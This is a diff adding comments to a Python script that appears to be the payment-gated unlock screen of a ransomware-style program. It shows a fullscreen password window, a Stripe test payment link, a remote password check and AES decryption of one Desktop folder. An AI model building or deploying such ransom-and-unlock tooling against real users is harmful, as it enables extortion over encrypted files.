@@ -9,6 +9,7 @@ SERVER_URL = "https://qlvtkhpjazvwfnqzoqjr.supabase.co/functions/v1/verify-passw
 PAYMENT_URL = "https://buy.stripe.com/test_3cI3cvghYcqiaMs7Pn4Rq00"
 
 # ----- Crypto -----
+# Generates encryption key from password and salt using PBKDF2
 def generate_key(password: str, salt: bytes) -> bytes:
     kdf = PBKDF2HMAC(
         algorithm=hashes.SHA256(), length=32, salt=salt,
@@ -16,6 +17,7 @@ def generate_key(password: str, salt: bytes) -> bytes:
     )
     return kdf.derive(password.encode())
 
+# Decrypts file content with AES-CBC, using salt and IV from file
 def decrypt_file(fp: str, password: str):
     with open(fp, "rb") as f:
         salt, iv, enc = f.read(16), f.read(16), f.read()
@@ -26,6 +28,7 @@ def decrypt_file(fp: str, password: str):
     data = unpad.update(dec) + unpad.finalize()
     open(fp, "wb").write(data)
 
+# Decrypts all files in directory recursively, skips flag file
 def decrypt_directory(path: str, password: str):
     for root, _, files in os.walk(path):
         for f in files:
@@ -39,12 +42,14 @@ def decrypt_directory(path: str, password: str):
     if os.path.exists(flag): os.remove(flag)
 
 # ----- Remote check -----
+# Verifies password against server for given user_id
 def verify_password(user_id: str, password: str) -> bool:
     r = requests.post(SERVER_URL, json={"user_id": user_id, "password": password})
     r.raise_for_status()
     return r.json().get("valid", False)
 
 # ----- User ID -----
+# Retrieves or creates unique user ID stored in file
 def get_or_create_user_id() -> str:
     id_file = os.path.expanduser("~/.user_id")
     if os.path.exists(id_file):
@@ -62,10 +67,13 @@ def get_or_create_user_id() -> str:
 import webbrowser
 
 # ----- Tkinter GUI -----
+# Displays fullscreen GUI for password entry and decryption
 def password_window(user_id: str, target_folder: str):
+    # Opens URL in browser
     def open_link(url: str):
         webbrowser.open_new(url)
 
+    # Handles password submission and verification
     def on_submit():
         pw = entry.get()
         if not pw:
@@ -86,6 +94,7 @@ def password_window(user_id: str, target_folder: str):
     window.attributes("-fullscreen", True)   # Full screen
 
     # allow ESC to exit fullscreen/close
+    # Binds escape key to close window
     def on_escape(event=None):
         window.destroy()
     window.bind("<Escape>", on_escape)
@@ -136,17 +145,22 @@ def password_window(user_id: str, target_folder: str):
 
 # ----- Main -----
 if __name__ == "__main__":
+    # Gets user ID
     user_id = get_or_create_user_id()
     print(f"User ID: {user_id}")
 
+    # Locates target folder on Desktop
     desktop = os.path.join(os.path.expanduser("~"), "Desktop")
     target_folder = os.path.join(desktop, "personal_Fa0337")
+    # Checks if target folder exists
     if not os.path.exists(target_folder):
         print("Folder not found.")
         sys.exit(1)
 
+    # Checks for encrypted flag
     if not os.path.exists(os.path.join(target_folder, ".encrypted_flag")):
         print("No encrypted files found.")
         sys.exit(1)
 
+    # Launches password entry GUI
     password_window(user_id, target_folder)
